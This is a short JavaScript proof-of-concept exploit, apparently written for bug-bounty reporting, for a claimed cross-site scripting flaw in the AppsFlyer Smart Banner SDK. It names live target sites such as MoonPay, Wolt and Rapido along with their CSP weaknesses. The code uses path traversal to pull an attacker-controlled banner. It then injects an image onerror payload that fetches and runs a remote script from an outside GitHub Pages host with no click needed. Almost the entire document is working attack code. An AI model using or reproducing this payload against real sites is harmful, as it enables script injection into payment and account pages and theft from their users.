// AppsFlyer Smart Banner XSS — Zero-Click Universal Console PoC
// Paste into DevTools Console on any target site
// Uses <img onerror> for ZERO-CLICK execution (no tap needed)
// Works on: MoonPay (report-only CSP), Rapido (unsafe-inline), Wolt (strict-dynamic bypass), Syfe (unsafe-inline)

(async(k,a)=>{
  // 1. Fetch attacker's banner via path traversal
  const u=new URL(`https://banner.appsflyersdk.com/sb/${k}/creative/../../${a}/preview`);
  const b=(await(await fetch(u.href)).json())[0];
  
  // 2. Fetch creative asset
  const c=await(await fetch(b.creative_url)).json();
  
  // 3. Inject layout via innerHTML (same as SDK _createElement)
  const w=document.createElement('div');
  w.innerHTML=c.layout;
  document.body.insertBefore(w.querySelector('#smart-banner'),document.body.firstChild);
  
  // 4. Inject zero-click payload via <img onerror> — fires automatically!
  const p=document.createElement('div');
  p.innerHTML='<img src=x onerror="import(\'//s1n6h.github.io/x.js\')">';
  document.body.appendChild(p);
})('VICTIM_KEY','e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad')
